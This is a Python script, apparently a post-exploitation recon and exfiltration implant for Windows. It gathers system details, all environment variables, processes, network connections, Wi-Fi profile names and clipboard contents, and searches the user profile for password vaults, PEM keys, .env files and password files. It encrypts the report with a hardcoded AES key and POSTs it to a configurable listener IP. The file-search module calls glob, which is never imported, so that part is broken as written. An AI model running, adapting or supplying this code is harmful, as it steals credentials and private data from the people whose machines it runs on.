import os
import platform
import socket
import getpass
import psutil
import requests
import subprocess
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

# ======================
# CONFIGURATION
# ======================

SERVER = "https://10.0.0.201"  # Change to your listener IP
KEY = b'1234567890abcdef'      # MUST match listener key (16 bytes AES key)
BLOCK_SIZE = 16                # AES block size

# ======================
# ENCRYPTION UTILITY
# ======================

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(data.encode(), BLOCK_SIZE))

def send_to_listener(payload):
    try:
        response = requests.post(SERVER, data=encrypt(payload), verify=False, timeout=10)
        return response.status_code
    except Exception as e:
        print(f"[X] Failed to send data: {e}")
        return None

# ======================
# RECON MODULES
# ======================

def get_system_info():
    info = "[System Info]\n"
    info += f"User: {getpass.getuser()}\n"
    info += f"Hostname: {socket.gethostname()}\n"
    info += f"OS: {platform.platform()}\n"
    info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
    info += f"Time: {datetime.now()}\n"
    return info

def list_env_vars():
    return "[Environment Variables]\n" + "\n".join([f"{k}={v}" for k, v in os.environ.items()])

def get_processes():
    info = "[Running Processes]\n"
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            info += f"{proc.info['pid']}: {proc.info['name']}\n"
        except:
            continue
    return info

def get_network_connections():
    info = "[Network Connections]\n"
    for conn in psutil.net_connections(kind='inet'):
        try:
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
            info += f"{laddr} -> {raddr} | Status: {conn.status}\n"
        except:
            continue
    return info

def search_sensitive_files():
    info = "[Interesting Files]\n"
    patterns = ["*.kdbx", "*.pem", "*.env", "*.txt", "*password*"]
    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
        for pattern in patterns:
            for file in glob.glob(os.path.join(root, pattern)):
                info += f"Found: {file}\n"
    return info

def get_wifi_profiles():
    info = "[Wi-Fi Profiles]\n"
    try:
        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        for line in result.split('\n'):
            if "All User Profile" in line:
                profile = line.split(":")[1].strip()
                info += f"{profile}\n"
    except:
        info += "Access Denied or No Wi-Fi\n"
    return info

def get_clipboard():
    info = "[Clipboard Contents]\n"
    try:
        import ctypes
        CF_TEXT = 1
        ctypes.windll.user32.OpenClipboard(0)
        handle = ctypes.windll.user32.GetClipboardData(CF_TEXT)
        data = ctypes.c_char_p(handle).value
        ctypes.windll.user32.CloseClipboard()
        info += data.decode()
    except:
        info += "Clipboard read failed."
    return info

# ======================
# MAIN EXECUTION
# ======================

if __name__ == "__main__":
    full_report = ""

    modules = [
        get_system_info,
        list_env_vars,
        get_processes,
        get_network_connections,
        search_sensitive_files,
        get_wifi_profiles,
        get_clipboard
    ]

    for mod in modules:
        try:
            result = mod()
            full_report += f"\n\n{result}"
        except Exception as e:
            full_report += f"\n\n[!] {mod.__name__} failed: {e}"

    send_to_listener(full_report)
